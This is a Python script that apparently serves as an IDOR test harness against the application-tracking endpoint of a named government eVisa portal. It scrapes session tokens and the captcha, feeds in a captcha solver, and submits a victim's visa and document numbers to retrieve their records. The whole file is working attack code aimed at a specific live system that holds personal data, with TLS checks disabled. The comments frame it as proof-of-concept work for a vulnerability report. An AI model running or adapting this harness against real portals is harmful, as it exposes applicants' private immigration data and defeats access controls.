#!/usr/bin/env python3
"""
Track-application IDOR harness for Liferay Portlet endpoints.

SPECIFIC TO: /en/track-your-application (portlet: _Trackapplication_WAR_trackapplicationportlet_)
TARGET: gov immigration portals with captcha-gated application tracking.

This is a specialized harness for the ROP eVisa track-application endpoint.
For generic IDOR, see dwr_client.py or idor_crossaccount.py.
"""

import requests, re, sys, time, json
import urllib3
urllib3.disable_warnings()

BASE = "https://evisa.rop.gov.om"
PAGE = "/en/track-your-application"
P = "_Trackapplication_WAR_trackapplicationportlet_"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def warm_page(s):
    """GET the track page to set p_auth."""
    r = s.get(f"{BASE}{PAGE}")
    pa = re.search(r'p_auth=([^"&]+)', r.text)
    cap_url = re.search(r'src="([^"]*captchaURL[^"]*)"', r.text)
    return pa.group(1) if pa else None, cap_url.group(1) if cap_url else None

def get_captcha(s, url):
    """One-shot captcha fetch. Returns binary image bytes."""
    if url.startswith("/"): url = BASE + url
    r = s.get(url)
    return r.content

def submit_track(s, visa_no, doc_no, captcha_text, pa):
    """Submit track form with p_auth and captcha."""
    data = {
        f"{P}seachVisaApplicationform": "true",
        f"{P}visaApplicationNumber": visa_no,
        f"{P}travelDocumentNumber": doc_no,
        f"{P}captchaText": captcha_text,
        "p_auth": pa or "",
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": UA, "Referer": f"{BASE}{PAGE}"}
    return s.post(f"{BASE}{PAGE}", data=data, headers=headers)

def classify(b):
    """Return the server's explicit verdict."""
    for pat, lab in [
        (r"Captcha Text invalid", "CAPTCHA_INVALID"),
        (r"[Ii]nvalid Username", "INVALID_USER"),
        (r"[Nn]o [Rr]ecord", "NO_RECORD"),
        (r"travel document", "DOC_RELATED"),
        (r"Application Number", "SHOWS_APP_FIELD"),
    ]:
        if re.search(pat, b):
            return lab
    return "UNCLASSIFIED"

def two_account_test(attacker_ticket, victim_visa, victim_doc, your_captcha_solver):
    """
    Perform the two-account IDOR proof.
    
    Steps:
    1. Attacker account makes a track request with VICTIM's application number
    2. Capture the response body (do NOT save PII values in logs)
    3. Verify the returned data references the victim, not the attacker
    
    Returns: (success_bool, response_preview)
    """
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})
    
    # Warm session and get fresh captcha
    pa, cap_url = warm_page(s)
    if not pa:
        return False, "no p_auth found"
    
    # Get captcha image (one-shot)
    img = get_captcha(s, cap_url)
    
    # YOUR CAPTCHA SOLVER HERE
    # For a proof, you need your own account to submit the form.
    captcha_text = your_captcha_solver(img)
    if not captcha_text:
        return False, "captcha failed"
    
    # Submit with victim's numbers
    r = submit_track(s, victim_visa, victim_doc, captcha_text, pa)
    return r.status_code == 200 and "UNCLASSIFIED" not in classify(r.text), r.text[:2000]

def main():
    # Example usage:
    # python3 track_idor.py GET_VISITOR_VISA_NO GET_VISITOR_DOC_NO <captcha_solution>
    if len(sys.argv) < 4:
        print("Usage: track_idor.py <victim_visa_no> <victim_doc_no> <captcha_solution>")
        sys.exit(1)
    
    visa_no, doc_no, captcha = sys.argv[1], sys.argv[2], sys.argv[3]
    
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})
    
    # Warm, solve, submit
    pa, cap_url = warm_page(s)
    if not pa:
        print("FAIL: could not get p_auth")
        sys.exit(2)
    
    img = get_captcha(s, cap_url)
    # TODO: integrate captcha solver
    print(f"Captcha URL: {BASE}{cap_url}")
    print(f"p_auth: {pa}")
    
    r = submit_track(s, visa_no, doc_no, captcha, pa)
    print(f"Status: {r.status_code}")
    print(f"Classification: {classify(r.text)}")
    
    # NEVER print the full response body — that contains the victim's PII
    # Only log that you got a 200 + data-type marker
    if r.status_code == 200 and classify(r.text) not in ("CAPTCHA_INVALID", "UNCLASSIFIED"):
        print("POTENTIAL IDOR: endpoint returned data with attacker's session")
        print("Capture FULL request/response for report (use Burp/Bookmarklet)")

if __name__ == "__main__":
    main()